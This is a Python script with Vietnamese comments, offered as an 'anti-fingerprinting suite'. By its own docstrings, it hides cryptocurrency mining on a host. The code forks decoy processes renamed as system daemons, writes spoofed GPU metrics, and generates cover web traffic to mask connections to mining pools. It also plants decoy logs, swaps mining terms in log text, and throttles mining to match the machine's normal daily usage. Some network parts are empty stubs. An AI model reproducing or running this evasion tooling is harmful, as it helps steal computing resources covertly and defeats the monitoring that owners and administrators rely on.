#!/usr/bin/env python3
"""
Anti-Fingerprinting Suite - Advanced Stealth Techniques
Bộ công cụ chống dấu vân tay - Kỹ thuật ẩn danh nâng cao

Tập trung vào mimicking normal behavior patterns
"""

import os
import time
import random
import psutil
import threading
import subprocess
import json
from pathlib import Path
from typing import Dict, List
import signal

class ProcessMimicry:
    """Che giấu mining processes bằng cách giả danh các process hợp pháp"""
    
    def __init__(self):
        self.legitimate_names = [
            'systemd-worker', 'kworker/0:1', 'migration/0', 'rcu_gp',
            'python3', 'java', 'node', 'chrome-renderer', 'firefox',
            'gnome-shell', 'NetworkManager', 'accounts-daemon'
        ]
        self.original_processes = {}
        
    def disguise_process_name(self, pid: int, target_name: str):
        """Thay đổi tên process để mimicking"""
        try:
            # Sử dụng prctl để thay đổi process name
            import ctypes
            import ctypes.util
            
            libc = ctypes.CDLL(ctypes.util.find_library('c'))
            PR_SET_NAME = 15
            
            # Set new process name
            result = libc.prctl(PR_SET_NAME, target_name.encode('utf-8'), 0, 0, 0)
            return result == 0
        except:
            return False
    
    def create_decoy_processes(self, count: int = 10):
        """Tạo các process giả để làm nhiễu"""
        decoy_pids = []
        
        for i in range(count):
            target_name = random.choice(self.legitimate_names)
            
            # Fork một process giả
            pid = os.fork()
            if pid == 0:  # Child process
                # Disguise the process name
                self.disguise_process_name(os.getpid(), target_name)
                
                # Simulate light activity
                while True:
                    time.sleep(random.uniform(0.5, 3.0))
                    # Minimal CPU usage to avoid detection
                    for _ in range(random.randint(100, 1000)):
                        pass
            else:
                decoy_pids.append(pid)
        
        return decoy_pids

class ResourceMasking:
    """Che giấu việc sử dụng tài nguyên GPU/CPU"""
    
    def __init__(self):
        self.baseline_metrics = {}
        self.masking_active = False
        
    def establish_baseline(self):
        """Thiết lập baseline usage để mimicking"""
        self.baseline_metrics = {
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'network_io': psutil.net_io_counters()._asdict()
        }
    
    def adaptive_throttling(self, current_gpu_usage: float) -> float:
        """Điều chỉnh adaptive để tránh detection patterns"""
        
        # Nếu GPU usage cao, inject artificial pauses
        if current_gpu_usage > 85:
            # Random pause 0.1-0.5 seconds
            pause_duration = random.uniform(0.1, 0.5)
            time.sleep(pause_duration)
            return current_gpu_usage * 0.7  # Reduce by 30%
        
        # Inject random noise in usage patterns
        noise = random.uniform(-5, 5)
        return max(0, min(100, current_gpu_usage + noise))
    
    def spoof_gpu_metrics(self):
        """Giả mạo GPU metrics để tránh monitoring"""
        # Tạo file fake metrics
        fake_metrics = {
            'gpu_utilization': random.uniform(10, 30),  # Low fake usage
            'memory_utilization': random.uniform(15, 40),
            'temperature': random.uniform(45, 60),
            'power_usage': random.uniform(50, 120)
        }
        
        # Write to fake metrics file
        metrics_file = '/tmp/.gpu_metrics_fake'
        with open(metrics_file, 'w') as f:
            json.dump(fake_metrics, f)
        
        return fake_metrics

class NetworkStealthing:
    """Che giấu network traffic đến mining pools"""
    
    def __init__(self):
        self.proxy_chains = []
        self.tor_enabled = False
        
    def setup_traffic_obfuscation(self):
        """Thiết lập obfuscation cho mining traffic"""
        techniques = {
            'domain_fronting': self._setup_domain_fronting,
            'traffic_mixing': self._setup_traffic_mixing,
            'protocol_tunneling': self._setup_protocol_tunneling
        }
        
        for technique, setup_func in techniques.items():
            try:
                setup_func()
                print(f"✅ {technique} configured")
            except Exception as e:
                print(f"❌ {technique} failed: {e}")
    
    def _setup_domain_fronting(self):
        """Setup domain fronting để che giấu destination"""
        # Configure traffic to appear going to legitimate CDNs
        fronting_domains = [
            'cloudflare.com', 'amazonaws.com', 'cloudfront.net',
            'akamai.com', 'fastly.com'
        ]
        
        # Modify routing table for domain fronting
        for domain in fronting_domains:
            # This would need actual implementation
            pass
    
    def _setup_traffic_mixing(self):
        """Mix mining traffic với legitimate traffic"""
        # Generate background legitimate traffic
        legitimate_targets = [
            'google.com', 'github.com', 'stackoverflow.com',
            'reddit.com', 'youtube.com'
        ]
        
        def generate_background_traffic():
            while True:
                target = random.choice(legitimate_targets)
                try:
                    # Lightweight HTTP request
                    subprocess.run(['curl', '-s', f'http://{target}'], 
                                 timeout=5, capture_output=True)
                except:
                    pass
                time.sleep(random.uniform(30, 120))
        
        # Start background traffic thread
        traffic_thread = threading.Thread(target=generate_background_traffic, daemon=True)
        traffic_thread.start()
    
    def _setup_protocol_tunneling(self):
        """Tunnel mining traffic qua protocols hợp pháp"""
        # DNS tunneling, HTTP tunneling, etc.
        pass

class LogObfuscation:
    """Che giấu và obfuscate log entries"""
    
    def __init__(self):
        self.log_rotation_active = False
        self.decoy_logs = []
        
    def create_decoy_logs(self):
        """Tạo fake logs để làm nhiễu"""
        decoy_entries = [
            "[INFO] System health check completed",
            "[INFO] Updating system packages",
            "[INFO] Network connectivity verified",
            "[INFO] Security scan completed",
            "[INFO] Database maintenance running",
            "[INFO] API endpoint responding normally"
        ]
        
        log_dir = Path('/tmp/decoy_logs')
        log_dir.mkdir(exist_ok=True)
        
        for i in range(10):
            log_file = log_dir / f"system_{i:02d}.log"
            with open(log_file, 'w') as f:
                for _ in range(random.randint(50, 200)):
                    entry = random.choice(decoy_entries)
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"{timestamp} {entry}\n")
    
    def obfuscate_mining_logs(self, log_content: str) -> str:
        """Obfuscate mining-related log content"""
        replacements = {
            'mining': 'processing',
            'miner': 'worker',
            'hash': 'checksum',
            'pool': 'cluster',
            'gpu': 'accelerator',
            'cuda': 'compute',
            'blockchain': 'database',
            'wallet': 'account',
            'difficulty': 'complexity'
        }
        
        obfuscated = log_content
        for original, replacement in replacements.items():
            obfuscated = obfuscated.replace(original, replacement)
        
        return obfuscated

class SystemBehaviorNormalization:
    """Normalize system behavior để tránh anomaly detection"""
    
    def __init__(self):
        self.behavior_patterns = {}
        self.normalization_active = False
        
    def learn_normal_patterns(self, duration_hours: int = 24):
        """Học patterns hành vi bình thường của hệ thống"""
        print(f"Learning normal behavior patterns for {duration_hours} hours...")
        
        start_time = time.time()
        end_time = start_time + (duration_hours * 3600)
        
        samples = []
        while time.time() < end_time:
            sample = {
                'timestamp': time.time(),
                'cpu_percent': psutil.cpu_percent(),
                'memory_percent': psutil.virtual_memory().percent,
                'process_count': len(psutil.pids()),
                'network_activity': psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
            }
            samples.append(sample)
            time.sleep(300)  # Sample every 5 minutes
        
        # Analyze patterns
        self.behavior_patterns = self._analyze_patterns(samples)
        return self.behavior_patterns
    
    def _analyze_patterns(self, samples: List[Dict]) -> Dict:
        """Phân tích patterns từ samples"""
        import numpy as np
        
        cpu_values = [s['cpu_percent'] for s in samples]
        memory_values = [s['memory_percent'] for s in samples]
        
        patterns = {
            'cpu_mean': np.mean(cpu_values),
            'cpu_std': np.std(cpu_values),
            'memory_mean': np.mean(memory_values),
            'memory_std': np.std(memory_values),
            'daily_cycles': self._detect_daily_cycles(samples)
        }
        
        return patterns
    
    def _detect_daily_cycles(self, samples: List[Dict]) -> Dict:
        """Detect daily usage cycles"""
        # Group by hour of day
        hourly_usage = {}
        for sample in samples:
            hour = time.localtime(sample['timestamp']).tm_hour
            if hour not in hourly_usage:
                hourly_usage[hour] = []
            hourly_usage[hour].append(sample['cpu_percent'])
        
        # Calculate averages per hour
        hourly_averages = {}
        for hour, usage_list in hourly_usage.items():
            hourly_averages[hour] = sum(usage_list) / len(usage_list)
        
        return hourly_averages
    
    def mimic_normal_behavior(self):
        """Điều chỉnh mining activity để mimic normal behavior"""
        if not self.behavior_patterns:
            print("❌ No learned patterns available")
            return
        
        current_hour = time.localtime().tm_hour
        
        # Get expected usage for current hour
        daily_cycles = self.behavior_patterns.get('daily_cycles', {})
        expected_cpu = daily_cycles.get(current_hour, 20)  # Default 20%
        
        # Adjust mining intensity based on expected normal usage
        if expected_cpu < 10:  # Low usage hours (night)
            return 0.3  # Reduce mining to 30%
        elif expected_cpu > 70:  # High usage hours (work time)
            return 0.8  # Can run at 80%
        else:
            return 0.5  # Moderate usage hours

# Master Anti-Fingerprinting Controller
class AntiFingerPrintController:
    """Controller chính điều phối tất cả anti-fingerprinting techniques"""
    
    def __init__(self):
        self.process_mimicry = ProcessMimicry()
        self.resource_masking = ResourceMasking()
        self.network_stealth = NetworkStealthing()
        self.log_obfuscation = LogObfuscation()
        self.behavior_normalizer = SystemBehaviorNormalization()
        
        self.active_techniques = []
        self.monitoring_thread = None
        
    def enable_full_stealth_mode(self):
        """Kích hoạt tất cả anti-fingerprinting techniques"""
        print("🥷 Enabling Full Stealth Mode...")
        
        techniques = [
            ('Process Mimicry', self._enable_process_mimicry),
            ('Resource Masking', self._enable_resource_masking),
            ('Network Stealthing', self._enable_network_stealth),
            ('Log Obfuscation', self._enable_log_obfuscation),
            ('Behavior Normalization', self._enable_behavior_normalization)
        ]
        
        for name, enable_func in techniques:
            try:
                enable_func()
                self.active_techniques.append(name)
                print(f"✅ {name} enabled")
            except Exception as e:
                print(f"❌ {name} failed: {e}")
        
        # Start continuous monitoring and adjustment
        self._start_adaptive_monitoring()
    
    def _enable_process_mimicry(self):
        """Enable process mimicry"""
        self.process_mimicry.create_decoy_processes(count=15)
    
    def _enable_resource_masking(self):
        """Enable resource masking"""
        self.resource_masking.establish_baseline()
    
    def _enable_network_stealth(self):
        """Enable network stealthing"""
        self.network_stealth.setup_traffic_obfuscation()
    
    def _enable_log_obfuscation(self):
        """Enable log obfuscation"""
        self.log_obfuscation.create_decoy_logs()
    
    def _enable_behavior_normalization(self):
        """Enable behavior normalization"""
        # Learn patterns in background (shortened for demo)
        self.behavior_normalizer.learn_normal_patterns(duration_hours=1)
    
    def _start_adaptive_monitoring(self):
        """Start continuous adaptive monitoring"""
        def monitor_and_adapt():
            while True:
                try:
                    # Continuously adapt behavior
                    adjustment_factor = self.behavior_normalizer.mimic_normal_behavior()
                    if adjustment_factor:
                        print(f"🔄 Adjusting mining intensity: {adjustment_factor:.1%}")
                    
                    # Spoof metrics
                    fake_metrics = self.resource_masking.spoof_gpu_metrics()
                    
                    time.sleep(60)  # Adjust every minute
                except Exception as e:
                    print(f"⚠️ Adaptive monitoring error: {e}")
                    time.sleep(30)
        
        self.monitoring_thread = threading.Thread(target=monitor_and_adapt, daemon=True)
        self.monitoring_thread.start()
    
    def get_stealth_status(self) -> Dict:
        """Lấy status của các stealth techniques"""
        return {
            'active_techniques': self.active_techniques,
            'monitoring_active': self.monitoring_thread and self.monitoring_thread.is_alive(),
            'stealth_level': len(self.active_techniques) / 5.0  # 0.0 to 1.0
        }

# Example usage
if __name__ == "__main__":
    controller = AntiFingerPrintController()
    
    print("🚀 Anti-Fingerprinting Suite")
    print("============================")
    
    # Enable full stealth mode
    controller.enable_full_stealth_mode()
    
    # Monitor status
    while True:
        status = controller.get_stealth_status()
        print(f"\n📊 Stealth Status: {status['stealth_level']:.1%}")
        print(f"Active: {', '.join(status['active_techniques'])}")
        
        time.sleep(30)
